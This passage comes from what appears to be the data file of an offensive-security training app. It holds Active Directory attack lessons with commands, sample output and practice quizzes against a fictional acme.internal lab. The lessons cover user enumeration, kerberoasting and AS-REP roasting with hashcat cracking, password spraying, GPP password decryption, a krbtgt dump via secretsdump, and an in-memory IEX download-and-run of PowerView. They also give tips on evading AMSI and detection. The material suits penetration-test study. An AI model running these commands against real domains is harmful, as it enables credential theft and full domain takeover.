      {"t":"Fall back to ldapsearch","d":"Raw ldapsearch does the same anonymous dump when nxc is unavailable.","demo":[{"run":"ldapsearch -x -H ldap://10.10.10.10 -b 'DC=acme,DC=internal' '(objectClass=user)' sAMAccountName","out":"sAMAccountName: jbloggs\nsAMAccountName: svc_backup","sig":"sAMAccountName: jbloggs"}],"note":"Same data, no tooling beyond ldap-utils."}]},
    "ad-user-enum": {"lead":"Kerbrute asks the KDC which usernames are real; a null SMB session sometimes lists them over RPC too.","items":[
      {"t":"Kerbrute a name list","d":"kerbrute userenum tests a wordlist of names; VALID USERNAME lines are confirmed accounts.","demo":[{"run":"kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt","out":"[+] VALID USERNAME:  jbloggs@acme.internal\n[+] VALID USERNAME:  svc_backup@acme.internal","sig":"VALID USERNAME:  jbloggs@acme.internal"}],"note":"Each VALID line is a real account; build users.txt from them."},
      {"t":"Try a null RPC session","d":"A null SMB session can list users via RID cycling when the DC is lenient.","demo":[{"run":"nxc smb 10.10.10.10 -u '' -p '' --rid-brute","out":"10.10.10.10  445  DC01  500: ACME\\Administrator (SidTypeUser)\n10.10.10.10  445  DC01  1104: ACME\\jbloggs (SidTypeUser)","sig":"1104: ACME\\jbloggs"}],"note":"RID cycling over a null session recovers names when Kerberos enum is slow."},
      {"t":"Seed from a name wordlist","d":"Build the candidate list from a common-names file plus any names you already saw.","demo":[{"run":"username-anarchy -i names.txt > users.txt && wc -l users.txt","out":"312 users.txt","sig":"users.txt"}],"note":"username-anarchy turns 'John Bloggs' into jbloggs, john.bloggs, bloggsj to feed kerbrute."}]},
    "bloodhound-collect": {"lead":"Collect from Linux with nxc or bloodhound-python, then load the zip into the GUI and run the pre-built queries.","items":[
      {"t":"Collect remotely","d":"nxc --bloodhound -c All gathers every collection method over LDAP from your box.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --bloodhound -c All --dns-server 10.10.10.10","out":"LDAP  10.10.10.10  389  DC01  [+] Compressing output into 20260105_bloodhound.zip","sig":"bloodhound.zip"}],"note":"That zip is what you import into the BloodHound GUI."},
      {"t":"Or use bloodhound-python","d":"The python collector is the fallback when nxc's module misbehaves.","demo":[{"run":"bloodhound-python -d acme.internal -u jbloggs -p 'Autumn2026!' -ns 10.10.10.10 -c All","out":"INFO: Found 24 users\nINFO: Found 7 computers\nINFO: Done in 00M 09S","sig":"Found 24 users"}],"note":"Same JSON output; drag the files into the GUI."},
      {"t":"Ask the shortest-path query","d":"Mark your user as Owned, then run 'Shortest Path to Domain Admins'.","demo":[{"run":"# in the GUI: mark jbloggs as Owned, run the Domain Admins query","out":"jbloggs -[MemberOf]-> Helpdesk -[GenericAll]-> svc_adm -[DCSync]-> acme.internal","sig":"[DCSync]-> acme.internal"}],"note":"The path ends in DCSync; that is your route to every hash in the domain."}]},
    "ad-path-manual": {"lead":"Query the high-value edges by hand: admin-count users, your own memberships, writable objects, and DCSync grants.","items":[
      {"t":"Find privileged users","d":"--admin-count lists accounts with adminCount=1, the protected high-value set.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count","out":"LDAP  10.10.10.10  389  DC01  Administrator\nLDAP  10.10.10.10  389  DC01  svc_adm\nLDAP  10.10.10.10  389  DC01  backup_admin","sig":"svc_adm"}],"note":"These are the accounts worth reaching; now look for an edge toward one."},
      {"t":"Check your own memberships","d":"Your groups may already grant a path you did not notice.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --query \"(sAMAccountName=jbloggs)\" \"memberOf\"","out":"memberOf: CN=Helpdesk,OU=Groups,DC=acme,DC=internal","sig":"CN=Helpdesk"}],"note":"Helpdesk often holds delegated rights worth checking next."},
      {"t":"Hunt writable objects and DCSync","d":"bloodyAD shows where you hold write rights or replication grants directly.","demo":[{"run":"bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' get writable","out":"svc_adm (GenericAll)\nDC=acme,DC=internal (DS-Replication-Get-Changes-All)","sig":"DS-Replication-Get-Changes-All"}],"note":"A replication grant is a direct DCSync path; GenericAll over svc_adm is an ACL win."}]},
    "nxc-arsenal": {"lead":"One auth syntax, many protocols and modules; drive enumeration, validation, and spidering from the same tool.","items":[
      {"t":"Enumerate in one shot","d":"Stack --shares --users --pass-pol to get the lay of the land in a single call.","demo":[{"run":"nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --users --pass-pol","out":"SMB  10.10.10.10  445  DC01  [+] Enumerated shares\nSHARE  SYSVOL   READ\nSHARE  backups  READ,WRITE\nPASSPOL  Lockout Threshold: 5","sig":"backups  READ,WRITE"}],"note":"A writable share and the lockout policy in one command; backups is worth a look."},
      {"t":"Validate creds across hosts","d":"Point the same creds at a subnet to find where they are local admin (Pwn3d!).","demo":[{"run":"nxc smb 10.10.10.0/24 -u svc_adm -p 'Password123'","out":"SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_adm:Password123 (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Pwn3d! means local admin on WEB01, a lateral-movement target."},
      {"t":"Switch protocol, same syntax","d":"The same -u/-p works for ldap, winrm, mssql, and more; just change the protocol word.","demo":[{"run":"nxc winrm 10.10.10.20 -u svc_adm -p 'Password123'","out":"WINRM  10.10.10.20  5985  WEB01  [+] acme.internal\\svc_adm:Password123 (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"WinRM Pwn3d! means evil-winrm will give you a shell."}]},
    "powerview-enum": {"lead":"Load PowerView in memory, then work the questions in order; each yields a named, actionable list.","items":[
      {"t":"Load it into memory","d":"IEX a download of PowerView.ps1 so nothing lands on disk.","demo":[{"run":"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1')","out":"(no output; the Get-Domain functions are now loaded)","sig":"(no output"}],"note":"No output is success; the Get-Domain functions are available now."},
      {"t":"Find kerberoast targets","d":"Get-DomainUser -SPN lists accounts with an SPN, the roastable set.","demo":[{"run":"Get-DomainUser -SPN | select samaccountname,serviceprincipalname","out":"samaccountname serviceprincipalname\n-------------- -------------------\nsvc_sql        MSSQLSvc/sql01.acme.internal","sig":"svc_sql"}],"note":"svc_sql has an SPN; it is a kerberoast target you can request a ticket for."},
      {"t":"Find where you are local admin","d":"Find-LocalAdminAccess maps which hosts your current token can admin.","demo":[{"run":"Find-LocalAdminAccess","out":"WEB01.acme.internal","sig":"WEB01.acme.internal"}],"note":"You are local admin on WEB01, a lateral-movement target from this foothold."}]},
    "ad-legacy-enum": {"lead":"net.exe, setspn, and nltest ship with Windows and trigger no AMSI; they cover users, groups, SPNs, and DCs.","items":[
      {"t":"List Domain Admins","d":"net group with /domain queries the DC for membership.","demo":[{"run":"net group \"Domain Admins\" /domain","out":"Members\n-------------------------------------------\nAdministrator            svc_adm","sig":"svc_adm"}],"note":"svc_adm is a Domain Admin; reaching it is the goal."},
      {"t":"Find SPN accounts","d":"setspn -T domain -Q */* lists every SPN, the kerberoast target set, with no upload.","demo":[{"run":"setspn -T acme.internal -Q */*","out":"CN=svc_sql,CN=Users,DC=acme,DC=internal\n    MSSQLSvc/sql01.acme.internal:1433","sig":"MSSQLSvc/sql01"}],"note":"svc_sql has an SPN; kerberoast it once you can request tickets."},
      {"t":"Locate the DC","d":"nltest names the DCs so you know where to aim Kerberos tooling.","demo":[{"run":"nltest /dclist:acme.internal","out":"DC01.acme.internal [PDC] [DS] Site: Default-First-Site-Name","sig":"DC01.acme.internal"}],"note":"DC01 is the PDC; prefer RDP over WinRM here to dodge the Kerberos double-hop."}]},
    "ad-psdotnet-enum": {"lead":"System.DirectoryServices and ADSI query the directory with built-in classes; write the search helper once and reuse it.","items":[
      {"t":"Resolve the domain and PDC","d":"The ActiveDirectory.Domain class finds the current domain and its PDC.","demo":[{"run":"[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()","out":"Name         : acme.internal\nPdcRoleOwner : DC01.acme.internal","sig":"acme.internal"}],"note":"No imports, no signatures; you have the domain and DC from framework classes."},
      {"t":"Query SPNs with ADSISearcher","d":"An [ADSISearcher] LDAP filter lists SPN accounts to kerberoast.","demo":[{"run":"([ADSISearcher]'(servicePrincipalName=*)').FindAll() | % { $_.Properties.samaccountname }","out":"svc_sql\nsvc_web","sig":"svc_sql"}],"note":"Same roast targets PowerView would show, from a built-in class."},
      {"t":"Reuse a search helper","d":"Wrap DirectorySearcher in a function so every later query is one line.","demo":[{"run":"function LDAP($f){ (New-Object DirectoryServices.DirectorySearcher $f).FindAll() }; LDAP '(adminCount=1)' | % { $_.Properties.samaccountname }","out":"Administrator\nsvc_adm","sig":"svc_adm"}],"note":"One helper, reused for admins, SPNs, and ACLs, with nothing on disk."}]},
    "trust-enum": {"lead":"Enumerate trusts after any foothold; a cross-domain group membership is the classic pivot.","items":[
      {"t":"List trusts from Windows","d":"nltest /domain_trusts names every trusting and trusted domain.","demo":[{"run":"nltest /domain_trusts","out":"List of domain trusts:\n    0: ACME acme.internal\n    1: CORP corp.internal (Forest Tree Root)","sig":"corp.internal"}],"note":"corp.internal is a second domain across a trust; it may be the real target."},
      {"t":"Enumerate trusts from Linux","d":"nxc's trust module works remotely with a credential.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M enum_trusts","out":"ENUM_TRUSTS  acme.internal -> corp.internal (Bidirectional, Forest)","sig":"corp.internal"}],"note":"A bidirectional forest trust means users can authenticate both ways."},
      {"t":"Find cross-domain membership","d":"A user in your domain sitting in a privileged group of the other domain is the pivot.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --query \"(memberOf=CN=Domain Admins,DC=corp,DC=internal)\" \"sAMAccountName\"","out":"sAMAccountName: acme_svc","sig":"acme_svc"}],"note":"acme_svc is in CORP's Domain Admins; owning it pivots you across the trust."}]}
  };
  Object.keys(AD1_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = AD1_HOW[k]; });

  var AD1_PRACTICE = {
    "ad-dc-identify": {situation:"A scan shows 88, 389, and 445 open on one host. What is the mandatory first step before any other AD attack?", choices:["ad-dc-identify","ad-anon-ldap-enum","asrep-roast","kerberoast"], coach:{"ad-anon-ldap-enum":"A great next move, but first you must name the domain and DC; that query needs the base DN this step establishes.","asrep-roast":"That needs a username list and the domain name, both of which come after you identify the DC.","kerberoast":"That needs a domain credential and the domain FQDN; you do not even know the domain name yet."}},
    "ad-anon-ldap-enum": {situation:"You identified the DC and hold no credentials. What is the highest-payoff thing to try first?", choices:["ad-anon-ldap-enum","ad-user-enum","password-spray","kerberoast"], coach:{"ad-user-enum":"A good fallback if the bind is closed; try the anonymous LDAP bind first, it gives more (full objects, descriptions) in one query.","password-spray":"You have no user list yet, and spraying blind risks lockouts; the anonymous bind may hand you the list.","kerberoast":"That needs a domain credential you do not have; the anonymous bind needs none."}},
    "ad-user-enum": {situation:"The anonymous LDAP bind is refused and you still have no credentials. How do you build a valid user list?", choices:["ad-user-enum","ad-anon-ldap-enum","bloodhound-collect","kerberoast"], coach:{"ad-anon-ldap-enum":"Already tried, the bind is closed; Kerberos user enumeration needs no bind at all.","bloodhound-collect":"That needs a domain credential; you are still credential-free and only building the user list.","kerberoast":"That needs a credential too; first confirm which usernames exist."}},
    "bloodhound-collect": {situation:"You just landed a domain credential and want to see your escalation routes at a glance. What do you run?", choices:["bloodhound-collect","ad-path-manual","kerberoast","dcsync"], coach:{"ad-path-manual":"A valid alternative (and the fallback when the collector fails), but BloodHound's graph shows all routes at once.","kerberoast":"A specific attack, not a map; collect the graph first to see whether roasting is even on your shortest path.","dcsync":"Often the end of the path, but you need replication rights first; the graph shows how to get them."}},
    "ad-path-manual": {situation:"SharpHound keeps erroring out and you still want to find your escalation path. What do you do?", choices:["ad-path-manual","bloodhound-collect","kerberoast","password-spray"], coach:{"bloodhound-collect":"That is exactly what is failing; querying the same facts by hand sidesteps the broken collection.","kerberoast":"One possible path, but check your memberships and writable objects first to see the whole picture.","password-spray":"You already have a credential; now map what it can reach rather than hunting for another."}},
    "nxc-arsenal": {situation:"You want to check shares, users, the password policy, and where your creds are admin, without juggling five tools. What do you reach for?", choices:["nxc-arsenal","bloodhound-collect","ad-legacy-enum","lateral-exec"], coach:{"bloodhound-collect":"Great for the graph, but for quick multi-protocol checks and admin-mapping, nxc is the one-syntax workhorse.","ad-legacy-enum":"That is for a locked-down Windows foothold with no uploads; from Kali, nxc does more in one line.","lateral-exec":"That is the next step once nxc shows Pwn3d!; first let nxc find where you are admin."}},
    "powerview-enum": {situation:"You have an interactive shell on a domain-joined Windows box and want deep AD recon without uploading heavy tooling. What do you use?", choices:["powerview-enum","ad-psdotnet-enum","bloodhound-collect","nxc-arsenal"], coach:{"ad-psdotnet-enum":"Your fallback if AMSI has signatured PowerView; try PowerView first for its richer, ready-made functions.","bloodhound-collect":"Runs from here too, but PowerView answers questions interactively without staging a collector and GUI.","nxc-arsenal":"That drives from Kali; from inside an interactive Windows session PowerView is the native-feeling recon tool."}},
    "ad-legacy-enum": {situation:"On a monitored Windows box, PowerView is flagged by AMSI and you cannot upload anything. How do you still enumerate the domain?", choices:["ad-legacy-enum","powerview-enum","ad-psdotnet-enum","bloodhound-collect"], coach:{"powerview-enum":"Already blocked, AMSI signatured it; the built-in net, setspn, and nltest trigger nothing.","ad-psdotnet-enum":"A stealthy middle option, but net.exe and setspn are always present and simplest when uploads are blocked.","bloodhound-collect":"That stages a collector, exactly what a monitored box will flag; living-off-the-land binaries do not."}},
    "ad-psdotnet-enum": {situation:"AMSI blocked PowerView when you tried to load it, but you still have a PowerShell prompt. What do you use for recon?", choices:["ad-psdotnet-enum","ad-legacy-enum","powerview-enum","nxc-arsenal"], coach:{"ad-legacy-enum":"Also works and is simpler, but bare .NET is more capable when you want arbitrary LDAP filters and still no signature.","powerview-enum":"Already blocked by AMSI; the whole point here is to avoid the signatured script.","nxc-arsenal":"That runs from Kali; you are inside an interactive Windows session where .NET classes query directly."}},
    "trust-enum": {situation:"You have Domain Admin in acme.internal. Before you call the engagement done, what should you check?", choices:["trust-enum","golden-ticket","dcsync","own-domain-pth"], coach:{"golden-ticket":"Persistence in the domain you own, but it does not tell you whether a richer domain sits across a trust.","dcsync":"You likely already did this to get here; trusts may expose a second domain worth the same treatment.","own-domain-pth":"That finishes the current domain; trust enumeration checks whether the real target is across a trust you have not looked at."}}
  };
  Object.keys(AD1_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = AD1_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === AD LANE : batch 2 (Credential Harvesting + Kerberos Tickets) ==============================
  var AD2_LEADUPS = {
    "asrep-roast": [
      { key: "users", label: "You have a user list", steps: [
        { title: "A confirmed user list", tool: "nxc", where: "local", cmd: "wc -l users.txt", out: "24 users.txt", sig: "users.txt", teach: "AS-REP roasting needs only usernames; any account that skips pre-auth hands out a crackable hash." } ] },
    ],
    "crack-asrep": [
      { key: "roasted", label: "You roasted an AS-REP", steps: [
        { title: "You have a $krb5asrep$ hash", tool: "cat", where: "local", cmd: "head -c 50 asrep.hash", out: "$krb5asrep$23$asrep_svc@ACME.INTERNAL:a1b2c3d4", sig: "$krb5asrep$23$asrep_svc", teach: "An AS-REP hash cracks offline with no further contact with the DC." } ] },
    ],
    "kerberoast": [
      { key: "cred", label: "You hold a domain credential", steps: [
        { title: "A credential works", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs", sig: "acme.internal\\jbloggs", teach: "Any authenticated user can request service tickets for SPN accounts; roast them all." } ] },
    ],
    "crack-tgs": [
      { key: "roasted", label: "You kerberoasted a service account", steps: [
        { title: "You have a $krb5tgs$ hash", tool: "cat", where: "local", cmd: "head -c 40 tgs.hash", out: "$krb5tgs$23$*svc_sql$ACME.INTERNAL$", sig: "$krb5tgs$23$*svc_sql", teach: "The ticket cracks offline to the service account's plaintext password." } ] },
    ],
    "password-spray": [
      { key: "users", label: "You have a user list, no credential", steps: [
        { title: "A user list but no password", tool: "nxc", where: "local", cmd: "wc -l users.txt", out: "24 users.txt", sig: "users.txt", teach: "One likely password against many accounts stays under lockout; read the policy first." } ] },
    ],
    "gpp-passwords": [
      { key: "read", label: "You have any domain read access", steps: [
        { title: "You can read SYSVOL", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares", out: "SHARE  SYSVOL  READ", sig: "SYSVOL  READ", teach: "SYSVOL is readable by every domain user; old GPP XML there can hold a reversible password." } ] },
    ],
    "smb-share-inventory": [
      { key: "cred", label: "You hold any credential", steps: [
        { title: "A credential or null session", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs", sig: "acme.internal\\jbloggs", teach: "Readable shares are where admins leave what they should not; inventory them all." } ] },
    ],
    "kerberos-tickets": [
      { key: "fail", label: "A Kerberos attack mysteriously failed", steps: [
        { title: "impacket -k just failed", tool: "impacket", where: "local", cmd: "impacket-psexec -k -no-pass administrator@dc01.acme.internal", out: "[-] Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)", sig: "KRB_AP_ERR_SKEW", teach: "Clock skew, not a broken tool; sync to the DC's time and retry." } ] },
    ],
    "silver-ticket": [
      { key: "hash", label: "You dumped a service account's hash", steps: [
        { title: "You hold the svc_sql service account's NT hash", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump acme.internal/jbloggs:'Autumn2026!'@sql01 | grep svc_sql", out: "svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::", sig: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6", teach: "A service account's hash forges a ticket for that account's own SPN (svc_sql owns MSSQLSvc/sql01), with no DC contact." } ] },
    ],
    "golden-ticket": [
      { key: "krbtgt", label: "DCSync gave you krbtgt", steps: [
        { title: "You dumped the krbtgt hash", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump acme.internal/svc_backup@10.10.10.10 -just-dc-user krbtgt", out: "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::", sig: "krbtgt:502:", teach: "The krbtgt hash is the key to forging TGTs for anyone; this is persistence, not a way in." } ] },
    ],
    "diamond-ticket": [
      { key: "krbtgt", label: "You hold krbtgt and want stealth", steps: [
        { title: "A plain golden ticket risks detection", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump acme.internal/svc_backup@10.10.10.10 -just-dc-user krbtgt", out: "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::", sig: "krbtgt:502:", teach: "With krbtgt you can forge tickets; a diamond ticket does it stealthily by editing a real one." } ] },
    ]
  };
  Object.keys(AD2_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = AD2_LEADUPS[k]; });

  var AD2_HOW = {
    "asrep-roast": {"lead":"Request an AS-REP for every username; accounts flagged DONT_REQUIRE_PREAUTH return a $krb5asrep$ hash with no login.","items":[
      {"t":"Roast the whole user list","d":"nxc --asreproast tries every name and writes the hashes of the vulnerable ones.","demo":[{"run":"nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash","out":"LDAP  10.10.10.10  389  DC01  [+] asrep_svc $krb5asrep$23$asrep_svc@ACME.INTERNAL:a1b2c3...","sig":"$krb5asrep$"}],"note":"Only pre-auth-disabled accounts appear; asrep_svc is roastable."},
      {"t":"Or target with impacket","d":"GetNPUsers roasts one named user or every name in a file.","demo":[{"run":"impacket-GetNPUsers acme.internal/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10","out":"$krb5asrep$23$asrep_svc@ACME.INTERNAL:9f8e7d...","sig":"$krb5asrep$23$asrep_svc"}],"note":"Same hash, impacket flavour; save it for cracking."},
      {"t":"Hand the hash to the cracker","d":"The $krb5asrep$ hash cracks offline with hashcat mode 18200.","demo":[{"run":"hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --quiet","out":"$krb5asrep$23$asrep_svc@ACME.INTERNAL:a1b2c3...:Summer2026!","sig":":Summer2026!"}],"note":"asrep_svc:Summer2026! is now a validated domain credential."}]},
    "crack-asrep": {"lead":"Mode 18200 for hashcat, or john's auto-detect; a hit is a validated login you should confirm.","items":[
      {"t":"Crack with hashcat","d":"Mode 18200 is AS-REP; point it at rockyou.","demo":[{"run":"hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt","out":"$krb5asrep$23$asrep_svc@ACME.INTERNAL:...:Summer2026!\nStatus...........: Cracked","sig":"Status...........: Cracked"}],"note":"asrep_svc:Summer2026! is a real credential now."},
      {"t":"Or crack with john","d":"john auto-detects the krb5asrep format.","demo":[{"run":"john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash","out":"Summer2026!      (asrep_svc)\n1g 0:00:00:02 DONE","sig":"(asrep_svc)"}],"note":"Same plaintext; use whichever tool is handy."},
      {"t":"Validate the credential","d":"Confirm it logs in before you build anything on it.","demo":[{"run":"nxc smb 10.10.10.10 -u asrep_svc -p 'Summer2026!'","out":"SMB  10.10.10.10  445  DC01  [+] acme.internal\\asrep_svc:Summer2026!","sig":"acme.internal\\asrep_svc"}],"note":"A validated login; now enumerate what it can reach."}]},
    "kerberoast": {"lead":"Request a TGS for every SPN account; each is encrypted with that account's password hash.","items":[
      {"t":"Roast every SPN","d":"nxc --kerberoasting pulls a ticket for each SPN-bearing account.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash","out":"LDAP  10.10.10.10  389  DC01  [+] svc_sql  $krb5tgs$23$*svc_sql$ACME.INTERNAL$...","sig":"$krb5tgs$23$*svc_sql"}],"note":"svc_sql's ticket is now in tgs.hash for offline cracking."},
      {"t":"Or with impacket","d":"GetUserSPNs -request lists the SPNs then prints each crackable ticket.","demo":[{"run":"impacket-GetUserSPNs acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -request","out":"ServicePrincipalName    Name     MemberOf\nMSSQLSvc/sql01.acme.internal  svc_sql\n$krb5tgs$23$*svc_sql$ACME.INTERNAL$...","sig":"MSSQLSvc/sql01"}],"note":"Lists the SPNs then prints each crackable ticket."},
      {"t":"Crack with mode 13100","d":"Kerberoast hashes are hashcat mode 13100.","demo":[{"run":"hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt","out":"$krb5tgs$23$*svc_sql$...:P@ssw0rd2024\nStatus...........: Cracked","sig":"Status...........: Cracked"}],"note":"svc_sql:P@ssw0rd2024, often over-privileged, so try it widely."}]},
    "crack-tgs": {"lead":"Mode 13100 cracks it; service accounts often carry weak, never-expiring passwords and heavy rights.","items":[
      {"t":"Crack with hashcat 13100","d":"13100 is the Kerberoast TGS mode; point it at rockyou.","demo":[{"run":"hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt","out":"$krb5tgs$23$*svc_sql$...:P@ssw0rd2024\nStatus...........: Cracked","sig":"Status...........: Cracked"}],"note":"svc_sql:P@ssw0rd2024 is a validated credential now."},
      {"t":"Check what it can reach","d":"Validate the cracked account across the subnet to find where it is admin.","demo":[{"run":"nxc smb 10.10.10.0/24 -u svc_sql -p 'P@ssw0rd2024'","out":"SMB  10.10.10.30  445  SQL01  [+] acme.internal\\svc_sql:P@ssw0rd2024 (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Pwn3d! on SQL01, a lateral step from a cracked service account."},
      {"t":"Check for Domain Admin","d":"Over-privileged service accounts are sometimes in Domain Admins outright.","demo":[{"run":"nxc ldap 10.10.10.10 -u svc_sql -p 'P@ssw0rd2024' --query \"(sAMAccountName=svc_sql)\" \"memberOf\"","out":"memberOf: CN=Domain Admins,CN=Users,DC=acme,DC=internal","sig":"CN=Domain Admins"}],"note":"An over-privileged service account can take you straight to DA."}]},
    "password-spray": {"lead":"Read the lockout policy, choose a seasonal or company password, and spray slowly.","items":[
      {"t":"Read the lockout policy first","d":"Know the threshold before you spray, or you lock accounts out.","demo":[{"run":"nxc smb 10.10.10.10 -u '' -p '' --pass-pol","out":"Account Lockout Threshold: 5\nReset Account Lockout Counter: 30 minutes","sig":"Lockout Threshold: 5"}],"note":"Five attempts before lockout; stay to one or two sprays per window."},
      {"t":"Spray one password","d":"--continue-on-success tries every user and keeps going past a hit.","demo":[{"run":"nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success","out":"SMB  10.10.10.10  445  DC01  [-] acme.internal\\jbloggs:Autumn2026!\nSMB  10.10.10.10  445  DC01  [+] acme.internal\\rhodes:Autumn2026!","sig":"[+] acme.internal\\rhodes"}],"note":"rhodes reused the seasonal password; that is your foothold."},
      {"t":"Use kerbrute for quieter spraying","d":"kerbrute passwordspray is Kerberos-based and avoids SMB logon noise.","demo":[{"run":"kerbrute passwordspray --dc 10.10.10.10 -d acme.internal users.txt 'Autumn2026!'","out":"[+] VALID LOGIN:  rhodes@acme.internal:Autumn2026!","sig":"VALID LOGIN:  rhodes@acme.internal"}],"note":"Same hit over Kerberos, quieter, and no failed-SMB-logon events."}]},
    "gpp-passwords": {"lead":"Find the Groups.xml carrying a cpassword, then reverse it with the public AES key.","items":[
      {"t":"Hunt the cpassword","d":"Recurse SYSVOL for GPP XML files carrying a cpassword attribute.","demo":[{"run":"nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M gpp_password","out":"GPP_PASS  Found SYSVOL\\acme.internal\\Policies\\...\\Groups.xml\nGPP_PASS  Username: svc_local  cpassword: kP3nQ9vR2xW5zL8tB4yC7dF1gH6jS0eU8iO2aK5mN3q","sig":"cpassword:"}],"note":"A cpassword means the GPP flaw is present; decrypt it next."},
      {"t":"Decrypt with the public key","d":"gpp-decrypt reverses the cpassword using Microsoft's published AES key.","demo":[{"run":"gpp-decrypt 'kP3nQ9vR2xW5zL8tB4yC7dF1gH6jS0eU8iO2aK5mN3q'","out":"Local*P@ss2020","sig":"Local*P@ss2020"}],"note":"svc_local:Local*P@ss2020, a local-admin password that often reuses across machines."},
      {"t":"Spray the recovered password","d":"GPP local-admin passwords get reused, so test it fleet-wide with --local-auth.","demo":[{"run":"nxc smb 10.10.10.0/24 -u svc_local -p 'Local*P@ss2020' --local-auth","out":"SMB  10.10.10.25  445  WS01  [+] WS01\\svc_local:Local*P@ss2020 (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Pwn3d! via a reused local-admin password; --local-auth because it is a local account."}]},
    "smb-share-inventory": {"lead":"List readable shares, then spider them for credential-bearing file names.","items":[
      {"t":"List readable shares","d":"--shares shows every share and your access level.","demo":[{"run":"nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares","out":"SHARE  SYSVOL   READ\nSHARE  IT       READ\nSHARE  backups  READ,WRITE","sig":"backups  READ,WRITE"}],"note":"backups is writable; IT may hold scripts and configs worth reading."},
      {"t":"Spider for interesting files","d":"spider_plus walks readable shares and records file names and sizes.","demo":[{"run":"nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus","out":"SPIDER  IT\\deploy.ps1\nSPIDER  IT\\unattend.xml\nSPIDER  backups\\db_backup.bak","sig":"unattend.xml"}],"note":"unattend.xml often holds an administrator password in cleartext."},
      {"t":"Pull and read a hit","d":"Download the promising file and grep it for secrets.","demo":[{"run":"smbclient '//10.10.10.10/IT' -U jbloggs%'Autumn2026!' -c 'get unattend.xml' && grep -i password unattend.xml","out":"<Password>SuperSecret2024!</Password>","sig":"SuperSecret2024!"}],"note":"A cleartext admin password from an unattend file; try it as a local or domain admin."}]},
    "kerberos-tickets": {"lead":"Sync the clock, set KRB5CCNAME, and obtain a TGT; these fix almost all -k failures.","items":[
      {"t":"Sync your clock to the DC","d":"Kerberos rejects auth when skew exceeds five minutes; match the DC's time.","demo":[{"run":"sudo ntpdate -u 10.10.10.10","out":"2026-10-05 14:02:11 ntpdate[2291]: adjust time server 10.10.10.10 offset +312.418 sec","sig":"offset +312.418 sec"}],"note":"A 312-second offset was the whole problem; now auth will succeed."},
      {"t":"Point tools at the ticket","d":"impacket reads the ccache from KRB5CCNAME; export it before any -k call.","demo":[{"run":"export KRB5CCNAME=administrator.ccache && klist","out":"Ticket cache: FILE:administrator.ccache\nDefault principal: administrator@ACME.INTERNAL","sig":"administrator@ACME.INTERNAL"}],"note":"klist confirms the ticket is loaded; now -k will use it."},
      {"t":"Obtain a TGT when you have none","d":"getTGT mints a ccache from a password or an NT hash.","demo":[{"run":"impacket-getTGT acme.internal/administrator -hashes :7a9c0e1f3b5d2a846c8e0f1a2b3c4d5e","out":"[*] Saving ticket in administrator.ccache","sig":"Saving ticket in administrator.ccache"}],"note":"Now export KRB5CCNAME to that file and every -k tool works."}]},
    "silver-ticket": {"lead":"Forge a TGS for a specific SPN as any user, using the service hash, the domain SID, and the SPN.","items":[
